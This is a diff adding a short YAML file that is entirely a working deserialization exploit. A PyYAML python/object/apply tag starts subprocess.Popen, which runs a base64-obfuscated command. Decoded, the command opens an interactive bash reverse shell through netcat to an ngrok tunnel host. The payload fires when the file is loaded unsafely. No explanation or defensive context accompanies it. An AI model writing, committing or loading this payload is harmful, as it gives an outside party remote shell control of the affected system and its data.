@@ -1,0 +1,5 @@
+yaml: !!python/object/apply:subprocess.Popen
+- !!python/tuple
+ - python
+ - -c
+ - "__import__('os').system(str(__import__('base64').b64decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAwLnRjcC5hcC5uZ3Jvay5pbyAxMDU2MCA+L3RtcC9m').decode()))"
